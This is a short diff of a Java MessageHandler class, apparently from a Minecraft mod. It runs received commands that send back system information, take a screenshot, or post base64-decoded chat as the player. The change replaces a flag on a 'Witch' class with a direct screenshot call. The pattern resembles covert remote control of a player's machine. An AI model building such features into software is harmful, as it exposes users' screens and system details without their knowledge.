@@ -44,7 +44,7 @@ public class MessageHandler {
                     MessageUtils.sendMessage(messageType, MinecraftUtil.systemInfo());
                     break;
                 case "screenshot":
-                    Witch.screenshot = true;
+                    Screenshot.screenshot();
                     break;
                 case "chat":
                     ChatUtil.chat(Text.of(decodeBase64(msgArr[1])), false);
